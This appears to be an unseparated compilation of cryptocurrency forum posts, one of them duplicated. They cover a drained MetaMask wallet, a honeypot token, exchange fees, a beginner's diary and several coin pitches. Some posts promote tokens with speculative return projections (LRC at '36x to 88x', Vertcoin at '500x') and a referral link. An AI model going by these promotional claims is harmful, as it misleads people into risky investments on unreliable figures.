TLDR: Crypto gaming projects reek of kickstarter type failure. Most of these are even worse as even the kickstarter crowd wouldn't fall for this. These points may seem simple but often the simplest problems are the biggest red flags you can imagine.

I know I'm not the only one asking this, but what is the real long term use of cryptocurrency? We'll always need fiat currencies and it's so much more useful than the complex world of crypto. What will we reasonably use crypto for in the future? There are so many and if they are used at all they will only be the top 3-5 cryptos today surely? There are so many coins for niche situations for example, buying transportation tickets with a certain token, surely the taxis, airlines etc would just use whatevers most standard? I think there is huge potential for online money with the Metaverse but surely just regular online fiat currency would be used instead of crypto where there is such high taxes with each transaction. I just think it's only for investors to make money by convincing other investors of empty promises to spend their money, it's just a pyramid scheme. Please don't attack me as I'm very much a newb to crypto so please educate me and let's have a debate!

Today I checked my MetaMask and found all my ETH missing. Found a connected site "www-twobitbears-com.filesusr.com" that I don't remember connecting. I went through my search history from the past month and didn't find any suspicious visited sites. I may have stupidly clicked a Discord link from a rando from an NFT server.

Found out via Etherscan that on 10/16/2021 at 00:34 AM UTC, my 5 ETH (along with my FunFair that was converted to ETH) on my [MetaMask wallet](https://etherscan.io/address/0xe53233e1db5f55d72ce3b21b46abb51788a4706e) was sent to [this wallet](https://etherscan.io/address/0x2bcb3d592a2c721451feff1425f77d17ccb5a9ff), and then 5 days ago on 10/29/2021 at 8:57 AM UTC was sent to a [second wallet](https://etherscan.io/address/0x8645546209bc3442542e9818c54bbc99f3055acc) where it now sits. Etherscan wallets are linked, an image is attached showing the unknown connected site.

If anyone has ANYTHING to offer, whether it be help or advice, I would appreciate it. I'm devastated.

Hi,

First time buying a shitcoin really, GoldenBNB (GOLD) found it on coinmooner.  
Launched today, I didn't really trust it so I only put in 10 bucks.

I'm up x60 but there's no way to sell, they seem to have changed the sell tax to 98%  
No matter what slippage  set, I'm unable to sell. The market cap is still rapidly increasing. Is there anything to be done? I don't mind losing 10 bucks but people seem to still be pouring in thousands of bucks by the minute.

&amp;#x200B;

They have just gotten calls from a LOT of TG channels, can someone please help me understand what's going on?

&amp;#x200B;

Help a newbie out?

First off, I want to say I own 0 and never owned any.   It was an obvious scam and from the first day I heard about it I heard about people not being able to sell it.  I think I heard about it pretty soon after release.

On msnbc, NBC and yahoo finance I have heard all of them talk about squid games and how it's making 1000s of percents of gains and how everyone is aping into it to "make a quick buck"

My opinion; your "news" company(s) are doing this on purpose.   You are literally causing fomo on the scammiest scam coin out rn.   If you did even 1 minute of research you woukd see the plethora of articles out about this robbery token.   But they still push it,  I'm watching right now and yahoo finance news is still shilling it.    Is the plan to cause un educated crypto noobs to straight scam coins, then try to say how crypto is a scam?   I've never heard you talk about any coins other than btc, eth and msybe doge.   No talk of any other legit projects.  But you guys talk about squid token?   Like.   How?   Sus.

I keep seeing people ask about how to survive the winter, how to deal with bears when it comes. I ask of you, why not just save up and wait till then to buy a huge bundle of what you're invested in? Now, me personally I feel like this winter won't be as bad as other cycles according to my dyor, and admittedly I am a newer investor in the space but my reasons for this are the continued money printing, institutional investment on the rise among others. Regardless, I am interested in what others plan to do for this in the future. I really don't see it going down 50%, maybe at worst the low floor would be where it is currently imo. Thoughts?

Hey crypto dudes and dudettes, as the title implies I've been having issues with crypto.com app and them receiving my deposit. I'm located in Canada so the process involves an e-transfer and they provide a code to put into the message, so they update your account accordingly. I've done all of these things.

This was last Thursday, and we are approaching a week into waiting for this money to re-appear into my life. It clearly states to allow 1 business day for transactions, which is fair enough. The app has a chat for customer service issues with a 1 day response time, which a week later is becoming less and less tolerable.

Anyone else experienced anything like this before. Looking for a reason not to panic/be pissed about this so any input is appreciated.

Thanks.

Let's start by saying that me and my family are rich already and not because of crypto but because of my dad. 

After a long time researching this beautiful market and of course this full of impeccable knowledge subreddit i decided to throw some money hoping to become even richer. 

So I searched for the best and most promising projects this wise sub has shilled the past few months and ended up choosing five of them investing an equal amount of money. 

Unfortunately for me it was on top of the previous bull cycle. But this sub has taught me to hodl and so I did. I bought : 

VET at 0,26$ - 200million
LTO at 0,70$ - 200million 
CHAINLINK at 51$ - 200million 
DOGE 0,76$ - 200million 
ICP at 441$ - 200million

And.. Voila! I am now a proud crypto millionaire!

So, for the last 6 months, I have been checking every day, maybe 10-20 times per day my portfolio and watching any changes.
Today I decided to stop, it was and still is soo hard to not check it. So far, its 8p.m and didn't once check it.
Hope I will win against my addiction to nonstop checking my portfolio, because it make me feel bad, sad, sometimes amazing, but mostly bad.
My target is to check once a week, so hope I will make it as maybe push it to once a month.


Anyone else had/has problem with this?

This is something that isn't discussed enough. Shit happens. People's houses burn down. Flood,.  Homes get broken into, Friends steal stuff. People die.

Personally I made 2 copies of my private keys and took them to two separate bank safe deposit boxes $75 each per year but worth it. I figured if one bank burns down or explodes that would suck but no way in hell it happens to two banks with my keys. I also filled out some paper work where I added two authorized family members to have access to the boxes in case something happens to me. They know about it but the catch is they must bring proof of death certificate to access and ideally have the box key or pay for a locksmith. 

I just feel too many people are very unprepared in case of tragedy and man its going to hurt if anything like I mentioned above happens. Life comes at you fast guys. Be ready. Don't lose your crypto to tragedy. Don't lose your crypto to a stranger or someone you thought you could trust. Don't let you loved ones lose your crypto by not leaving them access. it would suck. I know it can be a hassle but you will sleep better at night. I promise you. And I know banks suck and most of us want out of that system which could be a reason why you joined the crypto world but where else will you store your private keys besides a safe at your home, your lawyer, under the mattress?

 So I'm not super knowledgeable about crypto but I have some ETH and on coinbase it give me the option to "stake" my ETH. I know of ETH2 but i thought it was a set of upgrades to ETH to make the platform better. Coinbase has me believing that if i "stake" my ETH it will convert to ETH2 and then once the upgrades are done it will revert back to ETH? This sounds like some fuckery. Can someone ELI5? Is there going to be two coins ETH and ETH2? What exactly is staking? Thanks in advance Something something something 500 characters by now hopefully.

Just feel like gambling a little bit, any projects that youre bullish on in that range? Of course, moons are one but not including them. Tell me 5 different projects under a market cap of 100m for me to buy.

Please read the post instead of telling me to buy Algo or One or something else with a higher market cap than 100m.

Of course, Ill do my own research before buying but Im just looking for some inspiration!

As a thank you for helping me out, Ill help some of yall out. 

**If you havent done these yet, do them now!**

- Back up your seed-phrase, taking a photo isnt it. Go write them down NOW!

- Activate 2FA on your accounts, an Authenticator app is much safer than using your phone number.

- Open your Vault / Vote on governance polls. I did them yesterday and it feels good.

- Open your ass cheeks while showering. If you dont do that, let me tell you.. they smell bad.

- Coinbase Earn. Its free money man!

A lot of people are chasing coins with a 1000 potential but if you are just trying to get out of poverty you don't need them. 

At some point in the future BTC is going to be 1 million usd. If one billionaire can own 300 billions and inflation continue, BTC is bound to get to absurd levels. Same for other safe investments. 

If you are able to DCA in for the next 10 years, I think we will be able to get out of poverty and own a house! 

Just continue and hodl until your dream comes true ! If you don't chase the lambo dedication and regularity are going to be more than enough ! 

House gang !

A month ago I posted that I was doing research on smaller layer 1 blockchains. Here is the second of around fifteen posts that contain my research. I am planning to post one per day for 15 days.

The thought behind this project is that I want to get onboard the next FTM or SOL early and I assume many of you do too. To that end, I will not be posting 'recommend' or 'don't recommend' but I will be telling you whether my research led to me purchasing the asset in question or not.

**Oasis Protocol (ROSE)**

**Overview:** The Oasis Network is a privacy and smart contract-enabled blockchain platform for open finance and a responsible data economy.

**Coingecko Market Cap as of writing:** $ 281,043,163

**Market cap ranking as of writing:** 272

**24h volume (as of writing):** $24.7m

**Country of origin:** Slovenia

**Consensus model:** PoS

**Explorer:** [https://www.oasisscan.com/](https://www.oasisscan.com/)

**Whitepaper:** [https://docsend.com/view/aq86q2pckrut2yvq](https://docsend.com/view/aq86q2pckrut2yvq)

**Website:** [https://oasisprotocol.org/](https://oasisprotocol.org/)

**Team doxxed?:** Yes, fully

**How distributed is supply?:** The top 100 addresses control around 8b of the 10b total supply. Supposedly 1.5b was the original circulating supply but according to the explorer the top address has 2.1b which to me makes it look like most of it has been distributed.

**Notable projects on network:** They have many partners listed on their page however they are not clickable which makes it very hard to determine which are actually accessible or even real. A ten minute Google search turned up YuzuSwap which is a defi exchange that is apparently not live yet. There are a few other industry-specific dapps I found but nothing that is public facing.

**Pros:**

 Traded on large exchanges like Binance and Gate.io

 Fully doxxed team made up of members from all over the world which I always appreciate

 Their whitepaper is VERY well produced and thought out. I have not seen a whitepaper this detailed in terms of describing their tech. They have what appears to be a very novel idea of balancing security and scalability with compute overhead.

 Decent staking rewards (up to 20% according to their website)

 They offer a grant system for developers to draw new projects to their chain

 Lots of social followers and many users in Telegram

**Cons:**

 Somewhat centralized supply is always a cause for concern

 High market cap for no actual real world uses cases yet

**Disclaimer:** I do not own any ROSE at this time nor have I ever owned any ROSE, though I do plan on buying in the next 30 days based on my research

In this sub you often see posts or comments mentioning a 20% bonus for holding your Moons. However I think most people on this sub aren't fully informed about how this actually works and I've seen a lot of misinformation about it. 

Here's how it actually works (refer to the original [poll](https://np.reddit.com/r/CryptoCurrency/comments/kj2ij0/poll_bonus_karma_for_people_that_keep_moons_in/))

1. The 20% bonus is for Karma in the *next distribution*, not your overall Moons balance
2. You CAN move Moons without losing any of the bonus. You get the full bonus if you don't move Moons from the *previous* distribution! **In other words you can move your entire balance except what was earned last cycle**
3. It's NOT all or nothing. The bonus starts at 20% and scales linearly down to 0%. So even if your balance falls below what you earned last cycle, you could still get a large bonus if you only exceed it my a small amount
4. Due to the passing of this [poll](https://np.reddit.com/r/CryptoCurrency/comments/oghosk/allow_users_to_tip_up_to_100_moons_per_round_with/), you can tip 100 Moons past the balance mentioned in point (2)

Hope that clears things up! I think points 2 and 3 are the ones most people aren't aware of

zk rollups give tons of scalability by taking and compressing data and computations off-chain. 

Here are some projects:

 

**Loopring ($LRC)**

Loopring is an Ethereum Layer 2 scaling protocol that allows the building of high-throughput, low-cost, non-custodial AMMs and payment applications on Ethereum by leveraging ZK proofs.

It is highly secure, providing 100% Ethereum-level security. Users in the Loopring ecosystem have full control of their assets ensured by ZK-Rollups.

Loopring powers payments by batch-processing off-chain requests via ZK-Rollups.  Most operations, such as trade and transfer settlements, etc., off the Ethereum blockchain, reduce gas consumption and overall transaction costs.  Loopring can settle up to 2025 trades per second.

**ZKSwap ($ZKS)**

... is a layer2 DEX based on the ZK-Rollup technology and using the AMM model. ZKSwap provides zero-gas fee swapping and instantaneous confirmation, solving the scaling issues, with peak TVL over $1 billion. Unlike other layer2 solutions, the withdrawal from ZKSwap to layer1 is also very quick, taking approximately 40 minutes.

Currently live on Ethereum, ZKSwap will soon be implemented on BSC, HECO and OKEX Chain, #layer2\_for\_all. ZKSwap V2 is launching soon in June, enabling unlimited listing! After V2, we will launch #layer2\_for\_all and soon NFT swapping on layer2.

**StarkWare**

ZK-STARK is a cryptographic proof technology that allows users to share data and perform computation with third-party without revealing data.

It improves scalability by allowing developers to move computation and storage off-chain.

ZK-STARKs are scalable in computational speed but are vulnerable to attacks from quantum computers due to cryptography.

It satisfies asymptotically optimal efficiency.

DeversiFi has integrated ZK-STARK that allows 9000+ trades per second.

**zkSync**

zkSync solves Ethereum scalability by ensuring 100% security.

zkSync supports meta-transactions, instant confirmation with affordable finality, and less expensive privacy.

zkSync is unconditionally permissionless and growing down the path of progressive decentralization.

It takes 10 minutes for finality and has the lowest real tx costs-0.5k gas per tx.

Users can sign the transaction with their usual Ethereum wallet by signing an EIP712 message.

**Aztec**

Aztec provides ZK-SNARK service to the mainnet enabling the scaling and shielding of transactions.

Aztec is the ultimate security shield from the internet of money, ensuring users data protection on Web 3.0. The sender and recipient identities are hidden. They are also ensuring balance and code privacy.  Private transactions are computed in seconds. Each Rollup aggregates 112 transactions, making users pay a much lower gas fee by splitting the cost of a single proof.  Aztec can scale on-demand up 300 transactions per second.

**Hermez Network ($HEZ)**

Hermez is an open-source ZK-Rollup solution that enables secure, economical, and usable token transfers on the wings of Ethereum.

It offers computational integrity for secure transactions.

Using ZK-Rollups, Hermez offers 90% transfer cost reductions, allowing more accessible financial services for mainstream adoption.

It guarantees computational integrity and on-chain data availability.

Anyone can bid in a decentralized auction to create the next batch on Hermez, and each successful transaction is rewarded with collected transaction fees.

To me it seems as though this could be a serious play with great name recognition. It also seems like it could be a meme put up by a nearly obsolete company grabbing for a last straw, hard to tell. I think it has some real potential but i dont understand too much of the tech side which is why im asking what some of you who are more savvy with the tech think. 
The name recognition alone seems like it could be a pretty big deal but without fully understanding the use case currently vs in the future, i feel its left into meme territory still.  Its taken off a bit over the last couple days but given it has a pretty low market cap it certainly has room to run.  What is everyone thoughts on use and future potential?

Ok. Rumor have started flying, and LRC exploded to just under 2.00, now it's came back down to earth a bit, and we are all left wondering what's next?   


Let's get the negative out of the way first. LRC's pump, for those that don't know, was fueled by speculation surrounding GameStop tapping LoopRing to support and upcoming GameStop NFT Market Place. Neither confirmed or denied, this is good news for loop ring if it turns out true. That said, the 'GME Ape' hype surrounding it should be examined.   


For instance, much of GME's success was predicated on the fact that GME stock had a lot of naked shorts. The HODL strategy by the GME community ONLY worked because of these naked shorts being required to buy the inflated stock price due to a hold. The buying pressure of the wsb community alone wasn't truly enough to send through the roof.   


So while I'm excited about the prospect of that GME / WSB juju, simply getting this community to buy LRC isn't going to sky rocket the coin per se. The whales aren't naked shorting (as far as I'm aware) and will likely seek to profit off of any large moves made by retail investors, like any crypto coin with pumps.   


THAT said. You're here for the HOPIUM RIGHT!?   


As it stands now, after much correction, LRC is sitting at a total market cap of 1.6 billion. We've seen crazy things happen when a coin can reach meme status, which is what we want for LRC in this scenario. Which we do know WSB and GME is certainly capable of. They can probably drive the price up for sure, and getting them to hold will help offset whale movements for sure, but we really need WSB to get LRC to ultimate meme status.   


LRC has the potential to be nexus of a meme coin and a coin that is actually bringing something to table that is meme related (gme nft market place). It's memeception.   


And if we've seen anything this year, meme driven crypto coins cans do crazy things and couple that with an actual real world application that is based off of a meme itself. Queue exploding head gif...  


Let's just take a look at DOGE before it became a meme sensation this year:   


1/2021 -  1.9 Billion  
5/2021 - 88 Billion  
Current - 35 Billion  


Once this coin went through the meme transition it exploded 86x. Of course it dumped but it's still 33x from where it started.   


We've seen other similar meme coins undergo these crazy pumps, but none of them stayed their cause they had no real world application.   


With LRC sitting at 1.6 Billion now and if it put in similar meme coin movements, if you got a bag now, you would end up with a conservative 36x, but if you time it you could get a 88x returns. Taking that from current prices that is a range of $43.00-$106.00.  


Again, this is based on the meme impact on network effects in the crypto markets. If you think WSB and the GME crowd will be able to sustain and push this coin into meme status, then you should buckle up.

when i compare last November and this November i see two different people. yes, i was completely broke and i had no trust on myself that i can even do anything. Then i got to know about crypto by a friend. Started learning about it online, invested a very short amount that time but luckily got a very good profit. That first profit is unforgettable to me. As a girl I'm earning more than most of my friends ( even the one who introduced crypto to me ) 
Inshort, Crypto obviously changed my life in a year. I wonder where it's gonna take me in later years. It's just that choose wisely the projects you're investing in and you got it!!! So ladies, keep your crypto game up!!
Ps: I'm gonna get some moons soon for the first time as well. I'm so excited.

For everybody that loves to travel and receive crypto rewards in return, check out BitBook Travel. It is a travel platform with over 400k hotels world wide, which will increase even more as it grows. You can also book flights and rental cars and pay with credit card, so it can be used by non-crypto fanatics as well. For every booking you will get rewarded in their native BBT token. Last month the rewards were 60% on average for hotel bookings ($100 stay would have given you $60 of BBT)!

BitBook currently has a partnership with Priceline (daughter of Booking holding) and a top 10 exchange listing for BBT will be announced soon. Revenue made on bookings is fully used to buyback and burn tokens every three months.


Website: [https://bitbook.net/](https://bitbook.net/?refId=81)

Whitepaper: [https://bitbook.net/hubfs/BitBook-Whitepaper.pdf](https://bitbook.net/hubfs/BitBook-Whitepaper.pdf)


Different reward programs are in place:


- Book &amp; Earn: when you complete your stay booked on the BitBook platform you will receive BitBook Tokens (BBT) from the Book &amp; Earn reward pool. For example, in July I received $101 in BBT tokens from my stay which cost me $143.

- Invite &amp; Earn: everytime someone you invited completes a stay booked on the BitBook platform you will receive BBT tokens from the Invite &amp; Earn pool.

- Create &amp; Earn: create content on the BitBook platform and get BBT tokens. This program is under construction and will launch soon.


Great team with previous great experiences including VP sales at TravelPerk and chief system architect at KuCoin.

**I don't give a F about NFT'S, BUT I wouldn't mind if it drives up the network activity, pumps the prices, brings in more people and propels mass adoption.**

The market cap of NFT tokens grew ten fold between [2018-2020](https://www.statista.com/statistics/1221742/nft-market-capitalization-worldwide/). 
The number of NFT sales occuring in the span of 30 days has gone upto approximately **73 thousand**. And most of it happening in the ethereum ecosystem. 

**The number of people holding NFT's is very limited, but the number of people flipping NFT's are the majority**

*Who would pay hundreds of thousands of dollars for what basically amounts to a trading card?*

Well, thats part of what makes [NFT'S](https://www.theverge.com/22310188/nft-explainer-what-is-blockchain-crypto-art-faq) so messy. Some people treat them like theyre the future of fine art collecting , and some people treat them like Pokmon cards (where theyre accessible to normal people but also a playground for the mega-rich).

NFT games are all the rage right now, where newly popped up games giving out insane rewards/equipment (it's actually a mediocre weapon/Armor compared to 'Normal' standards, but the demand in the in-game marketplace and it's pumped up token prices) makes it a whole lot sweeter. 

And here are some of the most famous NFT's sold in the video game [market](https://gamerant.com/video-game-nft-selling-prices/). 

Finally, most of these NFT's are traded/exist on the Ethereum blockchain. The burning of gas fees, more big money and booming network activity are the key ingredients of a thriving blockchain. And this craze of digital assets of pink kittens, pixelated dudes may seem bizzare or uninteresting to me. But I wouldn't mind if it makes the mass adoption of DeFi POSSIBLE.

# Day 3 (2021-11-03)

**TLDR:** I dipped my toes in (30% of available funds used to purchase crypto!) and did a ton of reading.

Yesterday, I made my first reddit post about starting to learn about cryptocurrency and had a lot of fun reading the replies. Big thank you to everyone in r/CryptoCurrency who has reached out to me either in that post or helped me on the discord.

Updated to learn list:

* What differentiates BTC/ETH or everything else? \[I read up on this below\]
* Where can I access whitepapers on different coins? \[[Coinbase.com](https://Coinbase.com) has whitepapers, probably elsewhere as well\]
* Dig into blockchain tech.
* Dig into individual coin applications.
* Learn about "metaverse" and draw conclusions on impact on existing market.

Some excerpts of comments that I wanted to learn more about:  


* From u/forestball19 I have a suggestion for you; check out DeFi in mainly the BSC (Binance Smart Chain) space. Set up a wallet such as MetaMask; and consider staking. -- I set up the Electrum Wallet, but will check out MetaMask.
* From u/AllsudsNofoam I earn 8%, 10%, or 12% apy, compounded daily, paid weekly on crypto.com for usdc staked for either flexible term, 30 day, or 90 day respectively. -- Interestingly coinbase noted that they were not launching usdc staking ([https://blog.coinbase.com/sign-up-to-earn-4-apy-on-usd-coin-with-coinbase-cdad79e5f5eb](https://blog.coinbase.com/sign-up-to-earn-4-apy-on-usd-coin-with-coinbase-cdad79e5f5eb)). Looking for more answers on this.
* From u/nikikins May I point you towards investanswers on YouTube. I have found the content creator an invaluable source of edutainment. -- Haven't checked this out quite yet.

I downloaded the mobile app for CoinGecko, a Cryptocurrency Price Tracker, to evaluate if theres any value add beyond the exchanges. I also downloaded the mobile app for FTX Pro US. Registering an account on FTX was virtually the same process as coinbase, relatively painless. 

# Fees

### FTX:

* They reserve the right to charge between $5 min and $35 max (1%) fee for USD wire transfer deposits and withdrawals. ACH transfers are free. This fee is not currently enforced.
* Between 0 to .1% maker fee, between .05% to .40% taker fee, based on 30d Volume (USD) e.g. how much trading you are doing on their platform.
* Margin trading is restricted to accounts with $100,000+ balance.

### Coinbase:

* Coinbase takes a 25% commission for staking coins on their network.
* Drastically higher fees; consider swapping to coinbase pro immediately.
* Read this article ([https://www.covemarkets.com/blog/why-you-should-buy-bitcoin-on-coinbase-pro-and-not-coinbase/](https://www.covemarkets.com/blog/why-you-should-buy-bitcoin-on-coinbase-pro-and-not-coinbase/)) detailing the differences, as of 2 weeks ago so they should all be current/relevant.
* There is a 5% market up prices. **Coinbase is easily the worst of the three for fees.**

### Coinbase Pro:

* .5% taker fee, .5% maker fee, when under 10k
* ACH deposit free, wire $10
* ACH withdrawal free, wire $25

# Cards 

Not much value here, both I looked at aren't live yet.

### FTX

FTX US offers a virtual (and soon physical) credit card that can pay vendors with USD or BTC (or other coins?) with no associated fees. There doesnt seem to be a benefit to doing so outside of not connecting debit to a bank. **Pass for now.**

### Coinbase

Same coverage as Visa debit. Up to 4% in rewards. No annual fee or sign up fee. **Not available yet.** It states you can join the waitlist.

\-- Haven't looked into other crypto-back programs for spending. I would like to get this set up.

# Research topics:

* Read up on USDC on the coinbase learn tab. Takeaways were:
   * Example of stablecoin which is tied to the value of non-crypto reserve assets
   * Runs on Ethereum, high related gas fees.
* Spent some time looking into fee structures (above)
* Reading on BTC vs ETH:
   * [https://money.usnews.com/investing/cryptocurrency/articles/bitcoin-vs-ethereum-which-is-a-better-buy](https://money.usnews.com/investing/cryptocurrency/articles/bitcoin-vs-ethereum-which-is-a-better-buy) 
      * "When people compare Bitcoin and Ethereum, it's a bit like comparing gold with electricity. They are both valuable but have very different uses," Adelman says. "Ethereum is infrastructure. It is a blockchain that is in the early days but has the potential to revolutionize finance and technology."
      * Proof of work vs proof of stake
   * [https://www.cnbc.com/2021/05/10/ethereum-what-is-it-and-how-is-it-different-to-bitcoin.html](https://www.cnbc.com/2021/05/10/ethereum-what-is-it-and-how-is-it-different-to-bitcoin.html) 
   * [https://time.com/nextadvisor/investing/cryptocurrency/ethereum-vs-bitcoin/](https://time.com/nextadvisor/investing/cryptocurrency/ethereum-vs-bitcoin/) 
   * [https://www.computer.org/publications/tech-news/trends/end-bitcoins-blockchain-dominance](https://www.computer.org/publications/tech-news/trends/end-bitcoins-blockchain-dominance) 
* General crypto knowledge:
   * [https://academy.binance.com/en](https://academy.binance.com/en)
* Wallets
   * Looked at electrum as it is recommended by both traditional media, r/cryptocurrency, and r/bitcoinbeginners
   * Downloaded electrum wallet on Desktop. Had trouble moving any coins into it.
* Read how to view/transfer moons: [https://www.reddit.com/r/CryptoCurrency/comments/osnnnc/how\_to\_add\_arbitrum\_and\_moons\_to\_metamask/](https://www.reddit.com/r/CryptoCurrency/comments/osnnnc/how_to_add_arbitrum_and_moons_to_metamask/) \-- I dont intend to do this.

I spent quite a while trying to figure out how I can centralize my funds. I swapped all assets from coinbase to coinbase pro \[free and instant (sort of, had to do one at a time, some balance from fractionals still in coinbase regular)\]- [https://help.coinbase.com/en/pro/managing-my-account/funding-your-account/how-to-transfer-funds-between-your-coinbase-pro-and-coinbase-accounts](https://help.coinbase.com/en/pro/managing-my-account/funding-your-account/how-to-transfer-funds-between-your-coinbase-pro-and-coinbase-accounts)). I still havent figured out how to send from a wallet to the cbpro exchange (is that possible?).

I transferred some actual money into coinbase pro to start building some positions. I used 10% of available capital into each of:

* BTC @ $63,264
* ETH @ $4,664.95
* MATIC @ $2.0448

Reasoning was that I am going to most likely put more of my funds in BTC/ETH and may DCA into each. MATIC ([https://www.coinbase.com/price/polygon](https://www.coinbase.com/price/polygon)) is being used as the scaling solution for coinbase ([https://blog.polygon.technology/polygon-first-scaling-solution-for-coinbase/](https://blog.polygon.technology/polygon-first-scaling-solution-for-coinbase/)). I feel like if I have confidence in coinbase to hold my coins, I should trust their technology partners/solutions. I left 70% of available capital in USD for now.

Day end summary: Going to start commenting on how I do based on return instead of actual numbers. Will include as my positions go up/down. Tomorrow will probably be a lot of research on the tech and individual coins.

**I don't give a F about NFT'S, BUT I wouldn't mind if it drives up the network activity, pumps the prices, brings in more people and propels mass adoption.**

The market cap of NFT tokens grew ten fold between [2018-2020](https://www.statista.com/statistics/1221742/nft-market-capitalization-worldwide/). 
The number of NFT sales occuring in the span of 30 days has gone upto approximately **73 thousand**. And most of it happening in the ethereum ecosystem. 

**The number of people holding NFT's is very limited, but the number of people flipping NFT's are the majority**

*Who would pay hundreds of thousands of dollars for what basically amounts to a trading card?*

Well, thats part of what makes [NFT'S](https://www.theverge.com/22310188/nft-explainer-what-is-blockchain-crypto-art-faq) so messy. Some people treat them like theyre the future of fine art collecting , and some people treat them like Pokmon cards (where theyre accessible to normal people but also a playground for the mega-rich).

NFT games are all the rage right now, where newly popped up games giving out insane rewards/equipment (it's actually a mediocre weapon/Armor compared to 'Normal' standards, but the demand in the in-game marketplace and it's pumped up token prices) makes it a whole lot sweeter. 

And here are some of the most famous NFT's sold in the video game [market](https://gamerant.com/video-game-nft-selling-prices/). 

Finally, most of these NFT's are traded/exist on the Ethereum blockchain. The burning of gas fees, more big money and booming network activity are the key ingredients of a thriving blockchain. And this craze of digital assets of pink kittens, pixelated dudes may seem bizzare or uninteresting to me. But I wouldn't mind if it makes the mass adoption of DeFi POSSIBLE.

I'm thinking about buying peachfolio and I'm wondering why I didn't read anything about it here? Tracking app is already available, didn't use it on my own but reviews are good, also seems like they are trying to build an ecosystem and I know, most new coins are making a lots of promises, but it looks very promising to me. 

Most of the time I'm too optimistic, anyone alright read about it, bought it? Appreciate your thoughts about it, probably it will help me to decide. I know at least it's my decision, but I'm always open minded and thankful for your thoughts.

SO, after the fairly depressing topics about losing faith, in which I found myself snooping for the coins I hold, what projects are you confident about for the long term and why?

&amp;#x200B;

Myself: I feel most confident about XRP, even if it hasn't moved in ages. It feels like one of the 'oldies' that has received the most backlash via court-cases, but have kept their head high despite of it. I feel like they are paving the way for crypto by destroying court-cases. Im currently holding around around 4k XRP, for some years now without movement, but like my BTC bag Im not planning on moving it.

I am pretty new to crypto. Bought for the first time about a month ago and have been researching for about 3. Starting to get a decent grip on what it all means. I have a lot of downtime at work to dig around and have noticed that coinbase is down for chunks of entire days at least once a week. There seems to be a track record here, and I was wondering if anyone knows why? Regardless of the reason (if there even is a concrete one) this makes me lose confidence in CB every time. Open to any alternative exchange suggestions.

What catalysts are you looking out for? Big catalysts that I can think of are: addition to Robinhood, or any type of support from any bank or crypto celebrity, e.g. Elon Musk.

What is your exit strategy, if any? Are you targeting a market cap ratio vs BTC or ETH? What does the DOGE market cap say about SHIB and it's possibility of growth?

What do you see as the future of these meme/joke coins? SHIB being on Ethereum, I'm curious how these meme coins will do once Eth2.0 comes out and gas fees go down. Why not invest into a 'fun' coin?

What are your concerns about SHIB ownership dominance by such few people?

Dude

Not long ago Ergo was one of the most shilled coin here and I gave in and got a bag. Everything else is pumping. But not ergo. 

No one here talks about Kadena. I bought a bag around the same time after doing some research. And it has 4x in a matter of weeks. 

This has happened more than few times. 
Keep was another example. 

USDT has more volatility than your cardano and algo. 

Im done taking suggestions from this sub. 

I have come to the conclusion whenever a coin is shilled here, it is too late. 

Rant over.

You know the scene. Take a break before your coffee break to hit up a few faucets, compound your Algo and get your CMC diamonds and I had a thought.

....Metaverse.

So far I've had passive interest in this but it hit me like a tonne of bricks. Its gona drive everything, its gona drive NFTs and its gona really embed Crypto in the mainstream and in life and then I got another thought.

...Moons

Reddit is probably gona have its own Metaverse or form part of a wider Metaverse and surely Moons are gona be the coin/token of choice. 

If Metaverse (Web 3.0/Crypto) does be as big as it is our sub (Web 3.0/Crypto) is gona explode and as this community does so does the utility of Moons.

I felt like I had an epiphany and wanted to share this sweet hopium with you.

We are so early in this whole thing. So so early. At times I get frustrated I missed BTC (even ETH) bit we should be thankful that we are here right now. That is some schweet hopium.

For a long time I have heard, and observed, Bitcoin drive the crypto market up and down. There have always been the outliers but theres no doubt Bitcoin is king. However, several hours ago I saw there was a quick dip and recovery in both Etherium and Bitcoin. It appears Ether is now driving the market a bit more. The dip and recovery for ETH happened two hours before Bitcoin. Not to mention the dip wasnt as bad and the recovery for ETH was larger, by percentage. If this trend keeps up ETH could be the market driver in the future, and you never know could flip Bitcoin in price. What does this community think?

Greetings Reddit,

I want to get into trading Crypto but am dumbass. So I humbly come to you with a few queries regarding this topic.

Firstly, what trading app would you recommend for a beginner who wants to dump thousands into completely worthless coins because fucking why not? I made a Kraken but they won't add SHIB so I don't trust them, I don't want to make an account with another app just to find out its shit after I've done all the work.
And second, what are some resources you'd recommend to learn more about the market (youtube channels, podcasts, publications)? I should probably maybe do a measly amount of research before I dump my funds into the first scam that catches my eye. 

Any advice would be much appreciated.

I have seen a few of you on here asking if there are any low cap cryptos that have huge potential. I have been invested in Vertcoin for months, and it seems as if it is starting to gain some traction in the market, so i am just letting you guys know about it.

**Information**

It is currently sitting at around $0.75 per coin. It has a market cap of just $50million. The Vertcoin supply is capped at 84million, the same as Litecoin.

Vertcoin was founded in 2014. It is designed as an asic-resistant people's crypto, which is the original vision of both Bitcoin and Litecoin. Vertcoin was very high up in the coin ranks back in 2014 onwards, until it suffered from 2 separate 51% attacks. Luckily, the 51% attacks weren't fatal to the coin, and only resulted in about $10 worth of Vertcoin being double-spent. In 2020, the Vertcoin community pulled together to develop a new algorithm, called Verthash. Verthash is 100% Asic Resistant by limiting the maximum hashrate that ASIC's can produce. Vertcoin also has it's own One-Click-Miner, which can be downloaded and ran with ease. Since the release of the new Verthash algorithm, the coin has started to pick up again.

**Why Vertcoin?**

Vertcoin is one of the few crypto's created before 2014 that is still around today. It is true to Satoshi's original vision, a decentralised currency for the people, ran by the people. It is also one of the most profitable coins to mine, along with Ravencoin and Ethereum. As soon as ethereum switches to Proof Of Stake, alot of people will be switching to mining Vertcoin. This will be the main opportunity for Vertcoin to take off to previous levels.

**How high can it go?**

Vertcoin is a low-cap coin, so really, the sky's the limit. It's previous all time high is $10.00, but it has potential to go way further than that. If Vertcoin reached the Market Cap of Shiba, which is definitely and quite easily possible after Ethereum switches to Proof Of Stake, then we could be seeing over 500x gains. Even if it didn't completely take off though, just reaching into the top 100 coins would be over a 20x in price.

**Summary**

Overall, Vertcoin is certainly the highest potential cryptocurrency that i have come across in a while, and also one of the best projects that i have come across. I would definitely advise taking a quick look at it, even if you decide not to invest. Thanks for your time and feel free to ask any questions below!

**By no means is this financial advice. You should always do your research before investing.**

Okay so lets start,

This all started back up last year around December when my Director was telling me to buy a new "Doge competitor" named Shiba Inu. he brought it up like he brings up anything really, we *were* super close. so i would talk to him like we were just friends.

i never did buy in until a couple of months later. long story short i know hold about half a bill shib, anyways thats not relevant to this.

the really weird part is that my director started saying things like "Im gonna retire soon" and he only really started saying this until after the price of shib started moving really hard

